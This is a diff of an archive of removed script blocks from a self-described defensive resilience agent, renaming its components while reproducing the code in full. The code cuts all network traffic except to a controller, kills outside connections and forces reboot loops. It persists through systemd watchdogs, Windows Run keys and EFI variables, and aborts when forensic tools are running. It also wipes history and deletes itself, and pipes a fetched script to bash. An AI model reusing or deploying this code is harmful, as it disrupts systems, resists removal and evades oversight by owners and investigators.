@@ -2,82 +2,82 @@
 
 These blocks were removed or replaced to align the scripts with the owner-authorized defensive resilience-agent boundary. They are kept only for audit/reference.
 
-## Beryl.sh:818-872
+## Taygete.sh:818-872
 
-Reason archived: Windows Batman/Robin firewall, reboot, Run-key behavior does not match owner-authorized evidence preservation boundaries.
+Reason archived: Windows Pleiades/Electra firewall, reboot, Run-key behavior does not match owner-authorized evidence preservation boundaries.
 
 ```text
-818:     cat > /etc/systemd/system/batman-selfdestruct.service << EOF
+818:     cat > /etc/systemd/system/pleiades-selfdestruct.service << EOF
 819: [Unit]
 820: Description=Jack Sparrow Activation
-821: After=batman-supervisor.service
+821: After=pleiades-supervisor.service
 822: [Service]
 823: Type=oneshot
-824: ExecStart=/bin/sh -c 'if [[ -f /etc/batman-robind/bootcount ]] && [[ \$(cat /etc/batman-robind/bootcount) -ge 10 ]]; then touch /etc/batman-robind/jack_activated; fi'
+824: ExecStart=/bin/sh -c 'if [[ -f /etc/pleiades-electrad/bootcount ]] && [[ \$(cat /etc/pleiades-electrad/bootcount) -ge 10 ]]; then touch /etc/pleiades-electrad/jack_activated; fi'
 825: User=$TARGET_USER
 826: EOF
-827:     systemctl enable batman-selfdestruct.service
-828:     echo "Linux Batman & Robin deployed."
+827:     systemctl enable pleiades-selfdestruct.service
+828:     echo "Linux Pleiades & Electra deployed."
 829: 
 830: elif [[ "$OS" == "windows" ]]; then
-831:     # ------------------- WINDOWS BATMAN & ROBIN -------------------
-832:     cat > "$TEMP/batman_install.ps1" << 'WINPS'
+831:     # ------------------- WINDOWS PLEIADES & ELECTRA -------------------
+832:     cat > "$TEMP/pleiades_install.ps1" << 'WINPS'
 833: param($controller_ip, $controller_port, $limit=10)
 834: $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 835: if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
 836:     Start-Process powershell.exe "-File `"$PSCommandPath`" -controller_ip $controller_ip -controller_port $controller_port -limit $limit" -Verb RunAs
 837:     exit 0
 838: }
-839: $state_dir = "$env:ProgramData\BatmanRobin"
+839: $state_dir = "$env:ProgramData\PleiadesElectra"
 840: if (!(Test-Path $state_dir)) { New-Item -ItemType Directory -Force -Path $state_dir | Out-Null }
 841: $counter_file = Join-Path $state_dir 'bootcount.txt'
 842: $count = (Test-Path $counter_file) ? [int](Get-Content $counter_file) : 0
 843: if ($count -ge $limit) {
-844:     Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:$false -ErrorAction SilentlyContinue
+844:     Unregister-ScheduledTask -TaskName 'PleiadesElectraReboot' -Confirm:$false -ErrorAction SilentlyContinue
 845:     Remove-Item -Recurse -Force $state_dir -ErrorAction SilentlyContinue
 846:     exit 0
 847: }
 848: $count += 1
 849: Set-Content -Path $counter_file -Value $count
-850: $banner_script = Join-Path $state_dir 'bat-signal.ps1'
+850: $banner_script = Join-Path $state_dir 'pleiades-signal.ps1'
 851: @'
-852: while ($true) { Write-Host "`n    .-"-.\n   /     \\\n   |     |\n   \\   .-/\n    '-'-'      BATMAN & ROBIN ARE HERE\n   __|_|__\n   \\     /     ... protecting your network ...\n    \\___/" -ForegroundColor Cyan; Start-Sleep -Seconds 0.5 }
+852: while ($true) { Write-Host "`n    .-"-.\n   /     \\\n   |     |\n   \\   .-/\n    '-'-'      PLEIADES & ELECTRA ARE HERE\n   __|_|__\n   \\     /     ... protecting your network ...\n    \\___/" -ForegroundColor Cyan; Start-Sleep -Seconds 0.5 }
 853: '@ | Out-File -FilePath $banner_script -Encoding ASCII
 854: Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BatSignal' -Value "powershell.exe -WindowStyle Hidden -File `"$banner_script`"" -Force
 855: netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
-856: netsh advfirewall firewall add rule name="BatmanTelemetry" dir=out action=allow protocol=tcp remoteport=$controller_port
-857: netsh advfirewall firewall add rule name="BatmanDNS" dir=out action=allow protocol=udp remoteport=53
-858: netsh advfirewall firewall add rule name="BatmanDHCP" dir=out action=allow protocol=udp remoteport=67,68
-859: $robin_script = Join-Path $state_dir 'robin.ps1'
+856: netsh advfirewall firewall add rule name="PleiadesTelemetry" dir=out action=allow protocol=tcp remoteport=$controller_port
+857: netsh advfirewall firewall add rule name="PleiadesDNS" dir=out action=allow protocol=udp remoteport=53
+858: netsh advfirewall firewall add rule name="PleiadesDHCP" dir=out action=allow protocol=udp remoteport=67,68
+859: $electra_script = Join-Path $state_dir 'electra.ps1'
 860: @'
 861: while ($true) {
 862:     Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch '^127\.|^192\.168\.|^10\.' } | ForEach-Object { Remove-NetTCPConnection -LocalPort $_.LocalPort -RemotePort $_.RemotePort -RemoteAddress $_.RemoteAddress -Force -ErrorAction SilentlyContinue }
 863:     Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
 864: }
-865: '@ | Out-File -FilePath $robin_script -Encoding ASCII
-866: Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$robin_script`"" -PassThru
-867: $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:0 } }`""
+865: '@ | Out-File -FilePath $electra_script -Encoding ASCII
+866: Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$electra_script`"" -PassThru
+867: $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'PleiadesElectraReboot' -Confirm:0 } }`""
 868: $trigger = New-ScheduledTaskTrigger -AtStartup
-869: Register-ScheduledTask -TaskName "BatmanRobinReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
-870: Write-Host "Batman & Robin installed on Windows. Boot: $count / $limit"
+869: Register-ScheduledTask -TaskName "PleiadesElectraReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
+870: Write-Host "Pleiades & Electra installed on Windows. Boot: $count / $limit"
 871: WINPS
-872:     powershell.exe -ExecutionPolicy Bypass -File "$TEMP/batman_install.ps1" -controller_ip "$CONTROLLER_IP" -controller_port "$CONTROLLER_PORT" -limit 10
+872:     powershell.exe -ExecutionPolicy Bypass -File "$TEMP/pleiades_install.ps1" -controller_ip "$CONTROLLER_IP" -controller_port "$CONTROLLER_PORT" -limit 10
 ```
 
-## Vera.sh:383-388
+## Merope.sh:383-388
 
 Reason archived: Unsigned raw DNS fallback accepts an unauthenticated recovery signal; recovery channels must be signed/verified.
 
 ```text
 383:     # Fallback: raw DNS TXT (no signature verification — last resort only)
 384:     if [[ -z "$signal" ]] && command -v dig &>/dev/null; then
-385:         local dns_domain="${PURPLE_DNS_DROP:-purple-beacon.internal}"
+385:         local dns_domain="${PURPLE_DNS_DROP:-pleiades-beacon.internal}"
 386:         signal=$(dig +short TXT "$dns_domain" 2>/dev/null | tr -d '"' | \
 387:                  grep -o "RESURRECT" || echo "")
 388:     fi
 ```
 
-## SofiaX.sh:674-784
+## Maia.sh:674-784
 
 Reason archived: Active EFI variable/ESP write recovery path is not appropriate for current shippable defensive boundary; archived for design reference only.
 
@@ -85,20 +85,20 @@ Reason archived: Active EFI variable/ESP write recovery path is not appropriate 
 674: # ------------------------------------------------------------
 675: # 4. EFI capsule persistence — efivarfs first, ESP fallback
 676: # ------------------------------------------------------------
-677: SOPHIA_EFI_GUID="a8b4c2d6-e3f1-4a5b-9c7d-2e8f0a1b3c5d"
+677: MAIA_EFI_GUID="a8b4c2d6-e3f1-4a5b-9c7d-2e8f0a1b3c5d"
 678: 
 679: efi_capsule_persist() {
 680:     local bundle_file="$1"
-681:     local token_data="${2:-SOPHIA_DORMANT}"
+681:     local token_data="${2:-MAIA_DORMANT}"
 682:     [[ ! -f "$bundle_file" ]] && return 1
 683: 
 684:     # --- Try efivarfs ---
-685:     local efivar_path="/sys/firmware/efi/efivars/SophiaToken-${SOPHIA_EFI_GUID}"
+685:     local efivar_path="/sys/firmware/efi/efivars/MaiaToken-${MAIA_EFI_GUID}"
 686:     if [[ -d "/sys/firmware/efi/efivars" ]]; then
 687:         chattr -i "$efivar_path" 2>/dev/null || true
 688:         { printf '\x07\x00\x00\x00'; printf '%s' "$token_data"; } > "$efivar_path" 2>/dev/null && {
 689:             echo "[efi] Token persisted to efivarfs"
-690:             logger -t sophia "EFI variable written: $efivar_path"
+690:             logger -t maia "EFI variable written: $efivar_path"
 691:         }
 692:     fi
 693: 
@@ -115,7 +115,7 @@ Reason archived: Active EFI variable/ESP write recovery path is not appropriate 
 704:         esp_dev=$(fdisk -l 2>/dev/null | grep -i "EFI System" | awk '{print $1}' | head -1) || true
 705:         [[ -z "$esp_dev" ]] && esp_dev=$(blkid -t TYPE=vfat 2>/dev/null | head -1 | cut -d: -f1) || true
 706:         if [[ -n "$esp_dev" ]]; then
-707:             esp="/tmp/_sophia_esp_$$"
+707:             esp="/tmp/_maia_esp_$$"
 708:             mkdir -p "$esp"
 709:             mount "$esp_dev" "$esp" 2>/dev/null || { rm -rf "$esp"; esp=""; }
 710:         fi
@@ -131,9 +131,9 @@ Reason archived: Active EFI variable/ESP write recovery path is not appropriate 
 720:     cp "$bundle_file" "$efi_dir/payload.bin"
 721: 
 722:     # Sign the bundle and store signature alongside
-723:     if command -v sophia_crypto &>/dev/null && [[ -f /var/lib/.sophia/keys/ed25519.priv ]]; then
-724:         sophia_crypto sign "$efi_dir/payload.bin" > "$efi_dir/payload.sig" 2>/dev/null || true
-725:         sophia_crypto pubkey > "$efi_dir/pubkey.hex" 2>/dev/null || true
+723:     if command -v maia_crypto &>/dev/null && [[ -f /var/lib/.maia/keys/ed25519.priv ]]; then
+724:         maia_crypto sign "$efi_dir/payload.bin" > "$efi_dir/payload.sig" 2>/dev/null || true
+725:         maia_crypto pubkey > "$efi_dir/pubkey.hex" 2>/dev/null || true
 726:     fi
 727: 
 728:     # Write rehydrate.sh onto ESP
@@ -148,14 +148,14 @@ Reason archived: Active EFI variable/ESP write recovery path is not appropriate 
 737: # Abort if forensic tools are active
 738: pgrep -f "volatility|rekall|memdump|autopsy" &>/dev/null && exit 0
 739: 
-740: # Verify Ed25519 signature if sophia_crypto present
-741: if command -v sophia_crypto &>/dev/null && [[ -f "$SIG" ]] && [[ -f "$PUBKEY_FILE" ]]; then
+740: # Verify Ed25519 signature if maia_crypto present
+741: if command -v maia_crypto &>/dev/null && [[ -f "$SIG" ]] && [[ -f "$PUBKEY_FILE" ]]; then
 742:     sig=$(cat "$SIG")
-743:     sophia_crypto verify "$PAYLOAD" "$sig" || exit 1
+743:     maia_crypto verify "$PAYLOAD" "$sig" || exit 1
 744: fi
 745: 
 746: # Decompress and restore
-747: RESTORE_DIR="/var/lib/.sophia_restore_$$"
+747: RESTORE_DIR="/var/lib/.maia_restore_$$"
 748: mkdir -p "$RESTORE_DIR"
 749: tar -xzf "$PAYLOAD" -C "$RESTORE_DIR" 2>/dev/null || exit 1
 750: 
@@ -164,21 +164,21 @@ Reason archived: Active EFI variable/ESP write recovery path is not appropriate 
 753:     [[ -f "$installer" ]] && bash "$installer" &
 754: done
 755: 
-756: # Write sophia state back
-757: [[ -d "$RESTORE_DIR/.sophia" ]] && cp -a "$RESTORE_DIR/.sophia/." /var/lib/.sophia/ 2>/dev/null || true
+756: # Write maia state back
+757: [[ -d "$RESTORE_DIR/.maia" ]] && cp -a "$RESTORE_DIR/.maia/." /var/lib/.maia/ 2>/dev/null || true
 758: rm -rf "$RESTORE_DIR"
-759: echo "Sophia rehydration complete."
+759: echo "Maia rehydration complete."
 760: REHYD
 761:     chmod +x "$efi_dir/rehydrate.sh"
-762:     echo "$efi_dir" > /var/lib/.sophia/efi_location
+762:     echo "$efi_dir" > /var/lib/.maia/efi_location
 763:     echo "[efi] Bundle persisted to ESP: $efi_dir"
-764:     logger -t sophia "EFI bundle written to ESP: $efi_dir"
+764:     logger -t maia "EFI bundle written to ESP: $efi_dir"
 765: 
 766:     # Install systemd service for auto-rehydration (non-WSL only)
 767:     if [[ "$ENV" != "wsl" ]] && command -v systemctl &>/dev/null; then
-768:         cat > /etc/systemd/system/sophia-rehydrate.service << SVCEOF
+768:         cat > /etc/systemd/system/maia-rehydrate.service << SVCEOF
 769: [Unit]
-770: Description=Sophia Recovery Agent
+770: Description=Maia Recovery Agent
 771: After=multi-user.target
 772: 
 773: [Service]
@@ -189,13 +189,13 @@ Reason archived: Active EFI variable/ESP write recovery path is not appropriate 
 778: [Install]
 779: WantedBy=multi-user.target
 780: SVCEOF
-781:         systemctl daemon-reload 2>/dev/null && systemctl enable sophia-rehydrate.service 2>/dev/null || true
+781:         systemctl daemon-reload 2>/dev/null && systemctl enable maia-rehydrate.service 2>/dev/null || true
 782:     fi
 783:     return 0
 784: }
 ```
 
-## SofiaX.sh:906-944
+## Maia.sh:906-944
 
 Reason archived: Dormancy path deletes runtime state; evidence preservation requires sealing state, not wiping it.
 
@@ -204,44 +204,44 @@ Reason archived: Dormancy path deletes runtime state; evidence preservation requ
 907: # ------------------------------------------------------------
 908: enter_dormancy() {
 909:     local reason="${1:-unspecified}"
-910:     logger -t sophia "DORMANCY ACTIVATED — reason: $reason"
-911:     echo "[sophia] Entering dormancy: $reason"
+910:     logger -t maia "DORMANCY ACTIVATED — reason: $reason"
+911:     echo "[maia] Entering dormancy: $reason"
 912: 
-913:     # Signal all purple screens to quit
-914:     for sname in hatter_hivemind cheshire_hivemind resurrection_hivemind \
-915:                  zod_hivemind little_john lich_hivemind containment sophia; do
+913:     # Signal all pleiades screens to quit
+914:     for sname in alcyone_pleiades-swarm taygete_pleiades-swarm pleiades-rebirth_pleiades-swarm \
+915:                  atlas_pleiades-swarm celaeno lich_pleiades-swarm containment maia; do
 916:         screen -S "$sname" -X quit 2>/dev/null || true
 917:     done
 918:     sleep 3
 919: 
-920:     # Kill remaining purple binaries by exact name
-921:     for bin in hatter_server cheshire_server resurrection_hivemind zod_hivemind \
-922:                little_john ssh_decoy_logger resurrection_keeper threat_calc sophia_crypto; do
+920:     # Kill remaining pleiades binaries by exact name
+921:     for bin in alcyone_server taygete_server pleiades-rebirth_pleiades-swarm atlas_pleiades-swarm \
+922:                celaeno ssh_decoy_logger pleiades-rebirth_keeper threat_calc maia_crypto; do
 923:         pkill -x "$bin" 2>/dev/null || true
 924:     done
 925: 
 926:     # Bundle state for recovery
-927:     local bundle_dir="/tmp/sophia_dormancy_$$"
+927:     local bundle_dir="/tmp/maia_dormancy_$$"
 928:     mkdir -p "$bundle_dir"
-929:     cp -a /var/lib/.sophia "$bundle_dir/" 2>/dev/null || true
-930:     mkdir -p "$bundle_dir/purple_run"
-931:     cp /run/purple/* "$bundle_dir/purple_run/" 2>/dev/null || true
-932:     tar -czf "$bundle_dir/state.tar.gz" -C "$bundle_dir" .sophia purple_run 2>/dev/null || true
+929:     cp -a /var/lib/.maia "$bundle_dir/" 2>/dev/null || true
+930:     mkdir -p "$bundle_dir/pleiades_run"
+931:     cp /run/pleiades/* "$bundle_dir/pleiades_run/" 2>/dev/null || true
+932:     tar -czf "$bundle_dir/state.tar.gz" -C "$bundle_dir" .maia pleiades_run 2>/dev/null || true
 933: 
 934:     # Persist to EFI (efivarfs token + ESP bundle)
-935:     efi_capsule_persist "$bundle_dir/state.tar.gz" "SOPHIA_DORMANT:reason=$reason" || \
-936:         logger -t sophia "WARN: EFI persistence failed — no durable recovery path"
+935:     efi_capsule_persist "$bundle_dir/state.tar.gz" "MAIA_DORMANT:reason=$reason" || \
+936:         logger -t maia "WARN: EFI persistence failed — no durable recovery path"
 937: 
 938:     # Wipe runtime state
-939:     rm -rf /run/purple 2>/dev/null || true
-940:     rm -rf /var/lib/.resurrection 2>/dev/null || true
+939:     rm -rf /run/pleiades 2>/dev/null || true
+940:     rm -rf /var/lib/.pleiades-rebirth 2>/dev/null || true
 941:     rm -rf "$bundle_dir"
 942: 
-943:     logger -t sophia "DORMANCY COMPLETE"
+943:     logger -t maia "DORMANCY COMPLETE"
 944: }
 ```
 
-## SofiaX.sh:947-976
+## Maia.sh:947-976
 
 Reason archived: Migration wording and behavior should be reframed as safe-mode monitoring.
 
@@ -259,11 +259,11 @@ Reason archived: Migration wording and behavior should be reframed as safe-mode 
 957:         if [[ $score -ge 7 ]]; then
 958:             if [[ $hostile_since -eq 0 ]]; then
 959:                 hostile_since=$(date +%s)
-960:                 logger -t sophia "HIGH HOSTILITY detected (score=$score) — monitoring"
+960:                 logger -t maia "HIGH HOSTILITY detected (score=$score) — monitoring"
 961:             else
 962:                 local elapsed=$(( $(date +%s) - hostile_since ))
 963:                 if [[ $elapsed -ge 600 ]]; then
-964:                     logger -t sophia "Sustained hostility ${elapsed}s — entering dormancy"
+964:                     logger -t maia "Sustained hostility ${elapsed}s — entering dormancy"
 965:                     enter_dormancy "sustained_high_hostility_score=${score}"
 966:                     return
 967:                 fi
@@ -271,14 +271,14 @@ Reason archived: Migration wording and behavior should be reframed as safe-mode 
 969:         else
 970:             hostile_since=0
 971:             # Opportunistic dead-drop check when environment is calm
-972:             if command -v sophia_crypto &>/dev/null; then
+972:             if command -v maia_crypto &>/dev/null; then
 973:                 probe_dead_drops &>/dev/null || true
 974:             fi
 975:         fi
 976:     done
 ```
 
-## SofiaX.sh:1154-1167
+## Maia.sh:1154-1167
 
 Reason archived: Self-protection implementation truncates/chmods the live script; owner control requires non-destructive audit behavior.
 
@@ -291,31 +291,31 @@ Reason archived: Self-protection implementation truncates/chmods the live script
 1159:         echo "TEST_MODE active: skipping self-protection."
 1160:         return 0
 1161:     fi
-1162:     echo "$(date -u): Sophia deployment complete — environment: $ENV" >> "$LOGS_DIR/events.log"
+1162:     echo "$(date -u): Maia deployment complete — environment: $ENV" >> "$LOGS_DIR/events.log"
 1163:     history -c 2>/dev/null || true
 1164:     truncate -s 0 "$SELF_PATH" 2>/dev/null || true
 1165:     chmod 000 "$SELF_PATH" 2>/dev/null || true
-1166:     echo "Sophia has completed its task and will now vanish."
+1166:     echo "Maia has completed its task and will now vanish."
 1167: }
 ```
 
-## Beryl.sh:594-875
+## Taygete.sh:594-875
 
-Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-key behavior outside the clarified defensive evidence-preservation boundary.
+Reason archived: full legacy Pleiades/Electra helper performed reboot/firewall/run-key behavior outside the clarified defensive evidence-preservation boundary.
 
 ```text
 594: build_bash_helpers() {
-595:     cat > /etc/cheshire/loader.sh << "LOADER"
+595:     cat > /etc/taygete/loader.sh << "LOADER"
 596: #!/bin/bash
 597: CONTROLLER_IP="127.0.0.1"
 598: CONTROLLER_PORT="8080"
 599: TOKEN="$HTTP_TOKEN"
-600: FULL_URL="http://127.0.0.1:$CONTROLLER_PORT/batman-full.sh?token=$TOKEN"
+600: FULL_URL="http://127.0.0.1:$CONTROLLER_PORT/pleiades-full.sh?token=$TOKEN"
 601: curl -s "$FULL_URL" | bash -s "127.0.0.1" "$CONTROLLER_PORT"
 602: LOADER
-603:     chmod +x /etc/cheshire/loader.sh
+603:     chmod +x /etc/taygete/loader.sh
 604: 
-605:     cat > /etc/cheshire/batman-full.sh << 'BATMAN'
+605:     cat > /etc/taygete/pleiades-full.sh << 'PLEIADES'
 606: #!/bin/bash
 607: set -euo pipefail
 608: CONTROLLER_IP="${1:-}"
@@ -330,8 +330,8 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 617: fi
 618: 
 619: if [[ "$OS" == "linux" ]]; then
-620:     # ------------------- LINUX BATMAN & ROBIN -------------------
-621:     STATE_DIR="/etc/batman-robind"
+620:     # ------------------- LINUX PLEIADES & ELECTRA -------------------
+621:     STATE_DIR="/etc/pleiades-electrad"
 622:     COUNTER_FILE="$STATE_DIR/bootcount"
 623:     LIMIT=10
 624:     mkdir -p "$STATE_DIR"
@@ -340,10 +340,10 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 627:     else
 628:         count=$(cat "$COUNTER_FILE")
 629:         if [[ $count -ge $LIMIT ]]; then
-630:             systemctl stop batman-* 2>/dev/null || true
-631:             systemctl disable batman-* 2>/dev/null || true
-632:             rm -rf /etc/systemd/system/batman-*.service
-633:             rm -rf /usr/local/sbin/batman-* /usr/local/bin/robin-worker
+630:             systemctl stop pleiades-* 2>/dev/null || true
+631:             systemctl disable pleiades-* 2>/dev/null || true
+632:             rm -rf /etc/systemd/system/pleiades-*.service
+633:             rm -rf /usr/local/sbin/pleiades-* /usr/local/bin/electra-worker
 634:             rm -rf "$STATE_DIR"
 635:             systemctl daemon-reload
 636:             exit 0
@@ -352,7 +352,7 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 639:         fi
 640:     fi
 641: 
-642:     cat > /usr/local/bin/bat-signal << 'BATSIG'
+642:     cat > /usr/local/bin/pleiades-signal << 'BATSIG'
 643: #!/bin/bash
 644: duration=10
 645: end=$((SECONDS+duration))
@@ -361,7 +361,7 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 648:    /     \\
 649:    |     |
 650:    \\   .-/
-651:     '-'-'      BATMAN & ROBIN ARE HERE
+651:     '-'-'      PLEIADES & ELECTRA ARE HERE
 652:    __|_|__
 653:    \\     /     ... protecting your network ...
 654:     \\___/
@@ -375,38 +375,38 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 662: done
 663: wait
 664: BATSIG
-665:     chmod +x /usr/local/bin/bat-signal
-666:     cat > /etc/systemd/system/bat-signal.service << EOF
+665:     chmod +x /usr/local/bin/pleiades-signal
+666:     cat > /etc/systemd/system/pleiades-signal.service << EOF
 667: [Unit]
 668: Description=Bat Signal Display
 669: After=multi-user.target
 670: [Service]
 671: Type=oneshot
-672: ExecStart=/usr/local/bin/bat-signal
+672: ExecStart=/usr/local/bin/pleiades-signal
 673: [Install]
 674: WantedBy=multi-user.target
 675: EOF
-676:     systemctl enable bat-signal.service
+676:     systemctl enable pleiades-signal.service
 677: 
-678:     cat > /usr/local/sbin/batman-supervisor << 'BATSUP'
+678:     cat > /usr/local/sbin/pleiades-supervisor << 'BATSUP'
 679: #!/bin/bash
 680: TARGET=1
 681: MAX=3
 682: while true; do
-683:     ACTIVE=$(systemctl list-units --type=service --state=running | grep -c "robin-worker@")
+683:     ACTIVE=$(systemctl list-units --type=service --state=running | grep -c "electra-worker@")
 684:     if (( ACTIVE < TARGET )); then
 685:         for i in $(seq 1 $TARGET); do
-686:             if ! systemctl is-active --quiet "robin-worker@$i.service"; then
-687:                 systemctl start "robin-worker@$i.service"
+686:             if ! systemctl is-active --quiet "electra-worker@$i.service"; then
+687:                 systemctl start "electra-worker@$i.service"
 688:             fi
 689:         done
 690:     fi
 691:     sleep 5
 692: done
 693: BATSUP
-694:     chmod +x /usr/local/sbin/batman-supervisor
+694:     chmod +x /usr/local/sbin/pleiades-supervisor
 695: 
-696:     cat > /usr/local/sbin/robin-worker << 'ROBIN'
+696:     cat > /usr/local/sbin/electra-worker << 'ELECTRA'
 697: #!/bin/bash
 698: while true; do
 699:     ss -K state established '! ( dst 127.0.0.0/8 or dst 192.168.0.0/16 or dst 10.0.0.0/8 )' 2>/dev/null || true
@@ -414,53 +414,53 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 701:     resolvectl flush-caches 2>/dev/null || true
 702:     sleep $(( RANDOM % 60 + 30 ))
 703: done
-704: ROBIN
-705:     chmod +x /usr/local/sbin/robin-worker
+704: ELECTRA
+705:     chmod +x /usr/local/sbin/electra-worker
 706: 
-707:     cat > /usr/local/sbin/batman-watchdog << 'WDOG'
+707:     cat > /usr/local/sbin/pleiades-watchdog << 'WDOG'
 708: #!/bin/bash
 709: while true; do
-710:     if ! systemctl is-active --quiet batman-supervisor.service; then
-711:         systemctl start batman-supervisor.service
+710:     if ! systemctl is-active --quiet pleiades-supervisor.service; then
+711:         systemctl start pleiades-supervisor.service
 712:     fi
 713:     sleep 5
 714: done
 715: WDOG
-716:     chmod +x /usr/local/sbin/batman-watchdog
+716:     chmod +x /usr/local/sbin/pleiades-watchdog
 717: 
-718:     cat > /etc/systemd/system/batman-supervisor.service << EOF
+718:     cat > /etc/systemd/system/pleiades-supervisor.service << EOF
 719: [Unit]
-720: Description=Batman Supervisor
+720: Description=Pleiades Supervisor
 721: [Service]
 722: Type=simple
-723: ExecStart=/usr/local/sbin/batman-supervisor
+723: ExecStart=/usr/local/sbin/pleiades-supervisor
 724: Restart=always
 725: [Install]
 726: WantedBy=multi-user.target
 727: EOF
-728:     cat > /etc/systemd/system/robin-worker@.service << EOF
+728:     cat > /etc/systemd/system/electra-worker@.service << EOF
 729: [Unit]
-730: Description=Robin Worker %i
-731: BindsTo=batman-supervisor.service
+730: Description=Electra Worker %i
+731: BindsTo=pleiades-supervisor.service
 732: [Service]
 733: Type=simple
-734: ExecStart=/usr/local/sbin/robin-worker %i
+734: ExecStart=/usr/local/sbin/electra-worker %i
 735: Restart=always
 736: EOF
-737:     cat > /etc/systemd/system/batman-watchdog.service << EOF
+737:     cat > /etc/systemd/system/pleiades-watchdog.service << EOF
 738: [Unit]
-739: Description=Batman Watchdog
+739: Description=Pleiades Watchdog
 740: [Service]
 741: Type=simple
-742: ExecStart=/usr/local/sbin/batman-watchdog
+742: ExecStart=/usr/local/sbin/pleiades-watchdog
 743: Restart=always
 744: EOF
 745: 
 746:     systemctl daemon-reload
-747:     systemctl enable batman-supervisor.service batman-watchdog.service
-748:     systemctl start batman-watchdog.service
+747:     systemctl enable pleiades-supervisor.service pleiades-watchdog.service
+748:     systemctl start pleiades-watchdog.service
 749: 
-750:     cat > /etc/systemd/system/batman-reboot.timer << EOF
+750:     cat > /etc/systemd/system/pleiades-reboot.timer << EOF
 751: [Unit]
 752: Description=Reboot 1 min after boot
 753: [Timer]
@@ -468,14 +468,14 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 755: [Install]
 756: WantedBy=timers.target
 757: EOF
-758:     cat > /etc/systemd/system/batman-reboot.service << EOF
+758:     cat > /etc/systemd/system/pleiades-reboot.service << EOF
 759: [Unit]
 760: Description=Reboot service
 761: [Service]
 762: Type=oneshot
 763: ExecStart=/sbin/reboot
 764: EOF
-765:     systemctl enable batman-reboot.timer
+765:     systemctl enable pleiades-reboot.timer
 766: 
 767:     # Jack Sparrow trinket (FIXED – removed broken hidden-file check)
 768:     if [[ -n "${SUDO_USER:-}" ]]; then TARGET_USER="$SUDO_USER"; else TARGET_USER=$(who am i | awk '{print $1}'); fi
@@ -488,11 +488,11 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 775: MARKER="$HOME/.jack_active"
 776: if [[ -f "$MARKER" ]]; then exit 0; fi
 777: touch "$MARKER"
-778: if [[ ! -f "/etc/batman-robind/jack_activated" ]]; then
-779:     date +%s > /etc/batman-robind/jack_installed
+778: if [[ ! -f "/etc/pleiades-electrad/jack_activated" ]]; then
+779:     date +%s > /etc/pleiades-electrad/jack_installed
 780:     exit 0
 781: fi
-782: INSTALLED=$(cat /etc/batman-robind/jack_installed 2>/dev/null || echo 0)
+782: INSTALLED=$(cat /etc/pleiades-electrad/jack_installed 2>/dev/null || echo 0)
 783: NOW=$(date +%s)
 784: if (( NOW - INSTALLED < 1728000 )); then
 785:     exit 0
@@ -505,7 +505,7 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 792:     if [[ $(stat -c %Y "$REAL_PATH") -gt $(stat -c %Y "$MARKER") ]]; then
 793:         # Script was modified or accessed after marker – self‑destruct
 794:         find "$RUM_DIR" -name "*.rum" -exec mv {} {}.gone \; 2>/dev/null
-795:         rm -f "$MARKER" /etc/batman-robind/jack_activated /etc/batman-robind/jack_installed "$REAL_PATH"
+795:         rm -f "$MARKER" /etc/pleiades-electrad/jack_activated /etc/pleiades-electrad/jack_installed "$REAL_PATH"
 796:         exit 0
 797:     fi
 798:     NAME=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 20 | head -n1)
@@ -528,67 +528,67 @@ Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-k
 815:         chown -R "$TARGET_USER":"$TARGET_USER" "$HOME_DIR/.config/autostart"
 816:     fi
 817: 
-818:     cat > /etc/systemd/system/batman-selfdestruct.service << EOF
+818:     cat > /etc/systemd/system/pleiades-selfdestruct.service << EOF
 819: [Unit]
 820: Description=Jack Sparrow Activation
-821: After=batman-supervisor.service
+821: After=pleiades-supervisor.service
 822: [Service]
 823: Type=oneshot
-824: ExecStart=/bin/sh -c 'if [[ -f /etc/batman-robind/bootcount ]] && [[ \$(cat /etc/batman-robind/bootcount) -ge 10 ]]; then touch /etc/batman-robind/jack_activated; fi'
+824: ExecStart=/bin/sh -c 'if [[ -f /etc/pleiades-electrad/bootcount ]] && [[ \$(cat /etc/pleiades-electrad/bootcount) -ge 10 ]]; then touch /etc/pleiades-electrad/jack_activated; fi'
 825: User=$TARGET_USER
 826: EOF
-827:     systemctl enable batman-selfdestruct.service
-828:     echo "Linux Batman & Robin deployed."
+827:     systemctl enable pleiades-selfdestruct.service
+828:     echo "Linux Pleiades & Electra deployed."
 829: 
 830: elif [[ "$OS" == "windows" ]]; then
-831:     # ------------------- WINDOWS BATMAN & ROBIN -------------------
-832:     cat > "$TEMP/batman_install.ps1" << 'WINPS'
+831:     # ------------------- WINDOWS PLEIADES & ELECTRA -------------------
